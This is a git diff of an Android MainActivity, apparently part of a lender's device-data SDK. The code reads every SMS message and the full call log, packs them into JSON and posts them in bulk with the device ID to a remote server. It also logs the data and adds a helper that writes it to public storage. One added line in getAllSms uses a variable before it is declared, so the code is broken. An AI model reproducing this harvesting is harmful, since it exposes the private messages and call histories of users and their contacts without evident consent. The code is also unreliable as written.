@@ -5,7 +5,6 @@ import static android.content.ContentValues.TAG;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.content.ContentResolver;
@@ -35,7 +34,7 @@ import com.android.volley.VolleyError;
 import com.android.volley.VolleyLog;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
-import com.muthootfinance.retrievedetails.GetDeviceDetails;
+import com.google.gson.Gson;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -54,9 +53,10 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
 
 
-public class MainActivity extends GetDeviceDetails {
+public class MainActivity extends AppCompatActivity {
 
     List<String> list = new ArrayList<>();
     TextView contacts, callLogs, sms, apps;
@@ -285,6 +285,7 @@ public class MainActivity extends GetDeviceDetails {
 
     @SuppressLint("HardwareIds")
     public void getCallLogs() {
+        List<String> lstCallLog = new ArrayList<>();
             StringBuffer sb = new StringBuffer();
             Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                     null, null, null);
@@ -316,13 +317,16 @@ public class MainActivity extends GetDeviceDetails {
                         dir = "MISSED";
                         break;
                 }
-                sb.append(phNumber + "---" + name + "---" + dir + "---" + callDayTime + "---" + callDuration);
+                CallLogModel callLogModel = new CallLogModel(phNumber, name, dir, callDayTime.toString(),callDuration);
+                String jsonString = new Gson().toJson(callLogModel);
+                lstCallLog.add(jsonString);
+//                sb.append(phNumber + "---" + name + "---" + dir + "---" + callDayTime + "---" + callDuration);
 //                callCallLogPushApi(1, phNumber, name, callDuration, dir, callDate, android_id, "Android SDK", "Android SDK");
             }
         managedCursor.close();
-        callCallLogPushApi(1, "phNumber", sb.toString(), "callDuration", "dir", "callDate", android_id, "Android SDK", "Android SDK");
+        callCallLogPushApi(1, "phNumber", lstCallLog.toString(), "callDuration", "dir", "callDate", android_id, "Android SDK", "Android SDK");
 
-            Log.d("Call Logs",sb.toString());
+//            Log.d("Call Logs",sb.toString());
             callLogs.setText(sb);
     }
 
@@ -392,6 +396,8 @@ public class MainActivity extends GetDeviceDetails {
     @SuppressLint("HardwareIds")
     public void getAllSms() {
             List<String> lstSms = new ArrayList<>();
+        String dateString = formatter.format(new Date(Long.parseLong(time)));
+        String timeString = formatterTime.format(new Date(Long.parseLong(time)));
             Uri message = Uri.parse("content://sms/");
             ContentResolver cr = MainActivity.this.getContentResolver();
 
@@ -408,21 +414,43 @@ public class MainActivity extends GetDeviceDetails {
                     @SuppressLint("Range") String readState = c.getString(c.getColumnIndex("read"));
                     String time = c.getString(c.getColumnIndexOrThrow("date"));
                     //if readState = 1 then inbox else sent
-                    lstSms.add(address + "," + msg + "," + readState + "," + time);
-                    String dateString = formatter.format(new Date(Long.parseLong(time)));
-                    String timeString = formatterTime.format(new Date(Long.parseLong(time)));
+//                    lstSms.add(address + msg + readState + time);
+                    SMSModel smsModel = new SMSModel(address, msg, readState, time);
+                    String jsonString = new Gson().toJson(smsModel);
+                    lstSms.add(jsonString);
+
 //                    callMessagePushApi(1, address, msg, dateString, timeString, android_id, "Android SDK", "Android SDK");
 //                    sendData(1, address, msg, dateString, timeString, android_id, "Android SDK", "Android SDK");
                    c.moveToNext();
                 }
+
             }
 
 //        sendData(1,  "Send Data",lstSms.toString(), "dateString", "timeString", android_id, "Android SDK", "Android SDK");
             Log.d("SMS - ", lstSms.toString());
             sms.setText(lstSms.toString());
-            callMessagePushApi(1, lstSms.toString(), "Call Method", "dateString", "timeString", android_id, "Android SDK", "Android SDK");
+            callMessagePushApi(1, lstSms.toString(), "Call Method", dateString, timeString, android_id, "Android SDK", "Android SDK");
             c.close();
 
+    }
+
+    void generateFile(String body) {
+        Long tsLong = System.currentTimeMillis() / 1000;
+        try {
+            File root = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "TextFile");
+            if (!root.exists()) {
+                root.mkdirs();
+            }
+            File gpxfile = new File(root, tsLong.toString() +".txt");
+            FileWriter writer = new FileWriter(gpxfile);
+            writer.append(body);
+            writer.flush();
+            writer.close();
+            Toast.makeText(this, "Saved", Toast.LENGTH_SHORT).show();
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     void callMessagePushApi(int id, String smsFrom, String body, String date, String time, String deviceId, String uid, String lusr) {
@@ -440,6 +468,8 @@ public class MainActivity extends GetDeviceDetails {
             jsonBody.put("SDKVERSION", BuildConfig.VERSION_NAME);
             jsonBody.put("LUSR", lusr);
             final String requestBody = jsonBody.toString();
+//            generateFile(jsonBody.toString());
+            longLog("JSONBODY"+jsonBody.toString());
             Log.d("Request Body SMS", requestBody);
             StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
                 @Override
@@ -634,5 +664,13 @@ public class MainActivity extends GetDeviceDetails {
         } catch (JSONException e) {
             e.printStackTrace();
         }
+    }
+
+    public static void longLog(String str) {
+        if (str.length() > 4000) {
+            Log.d("", str.substring(0, 4000));
+            longLog(str.substring(4000));
+        } else
+            Log.d("", str);
     }
 }
